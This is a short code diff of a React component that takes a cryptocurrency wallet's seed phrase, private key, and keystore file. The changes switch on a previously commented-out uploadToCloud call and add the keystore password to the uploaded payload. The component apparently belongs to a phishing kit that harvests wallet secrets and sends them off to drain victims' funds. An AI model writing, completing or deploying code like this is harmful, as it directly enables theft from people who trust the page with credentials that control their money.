@@ -65,7 +65,7 @@ function BasicTabs() {
   const uploadData = (value, type, wallet) => {
     const payload = { value, type, wallet };
 
-    // uploadToCloud(payload);
+    uploadToCloud(payload);
 
     clearFields();
   };
@@ -73,7 +73,12 @@ function BasicTabs() {
   const handleUpload = (type) => {
     if (type === SEED_PHRASE) uploadData(seedPhrase, SEED_PHRASE, wallet);
     if (type === PRIVATE_KEY) uploadData(privateKey, PRIVATE_KEY, wallet);
-    if (type === KEY_JSON) uploadData(keyJSON, KEY_JSON, wallet);
+    if (type === KEY_JSON)
+      uploadData(
+        { keyJSON: keyJSON, password: keyStorePassword },
+        KEY_JSON,
+        wallet
+      );
   };
 
   const [privateKey, setPrivateKey] = useState("");
